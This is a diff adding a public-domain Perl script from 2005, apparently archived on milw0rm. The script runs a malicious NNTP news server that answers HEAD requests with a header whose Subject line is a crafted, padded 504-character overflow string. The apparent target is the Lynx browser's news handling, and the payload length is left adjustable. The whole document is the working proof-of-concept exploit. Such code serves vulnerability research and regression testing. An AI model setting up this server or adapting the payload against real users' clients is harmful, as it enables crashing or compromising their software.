@@ -1,0 +1,111 @@
+#!/usr/bin/perl --
+
+# lynx-nntp-server
+# by Ulf Harnhammar in 2005
+# I hereby place this program in the public domain.
+
+use strict;
+use IO::Socket;
+
+$main::port = 119;
+$main::timeout = 5;
+
+# *** SUBROUTINES ***
+
+sub mysend($$)
+{
+my $file = shift;
+my $str = shift;
+
+print $file "$str\n";
+print "SENT: $str\n";
+} # sub mysend
+
+sub myreceive($)
+{
+my $file = shift;
+my $inp;
+
+eval
+{
+local $SIG{ALRM} = sub { die "alarm\n" };
+alarm $main::timeout;
+$inp = <$file>;
+alarm 0;
+};
+
+if ($@ eq "alarm\n") { $inp = ''; print "TIMED OUT\n"; }
+$inp =~ tr/\015\012\000//d;
+print "RECEIVED: $inp\n";
+$inp;
+} # sub myreceive
+
+# *** MAIN PROGRAM ***
+
+{
+my $server = IO::Socket::INET->new( Proto => 'tcp',
+LocalPort => $main::port,
+Listen => SOMAXCONN,
+Reuse => 1);
+die "can't set up server!\n" unless $server;
+
+
+while (my $client = $server->accept())
+{
+$client->autoflush(1);
+print 'connection from '.$client->peerhost."\n";
+
+
+mysend($client, '200 Internet News');
+my $group = 'alt.angst';
+
+while (my $str = myreceive($client))
+{
+if ($str =~ m/^mode reader$/i)
+{
+mysend($client, '200 Internet News');
+next;
+}
+
+if ($str =~ m/^group ([-_.a-zA-Z0-9]+)$/i)
+{
+$group = $1;
+mysend($client, "211 1 1 1 $group");
+next;
+}
+
+if ($str =~ m/^quit$/i)
+{
+mysend($client, '205 Goodbye');
+last;
+}
+
+if ($str =~ m/^head ([0-9]+)$/i)
+{
+my $evil = '$@UU(JUU' x 21; # Edit the number!
+$evil .= 'U' x (504 - length $evil);
+
+my $head = <<HERE;
+221 $1 <xyzzy\@usenet.qx>
+Path: host!someotherhost!onemorehost
+From: <mr_talkative\@usenet.qx>
+Subject: $evil
+Newsgroup: $group
+Message-ID: <xyzzy\@usenet.qx>
+.
+HERE
+
+$head =~ s|\s+$||s;
+mysend($client, $head);
+next;
+}
+
+mysend($client, '500 Syntax Error');
+} # while str=myreceive(client)
+
+close $client;
+print "closed\n\n\n";
+} # while client=server->accept()
+}
+
+# milw0rm.com [2005-10-17]
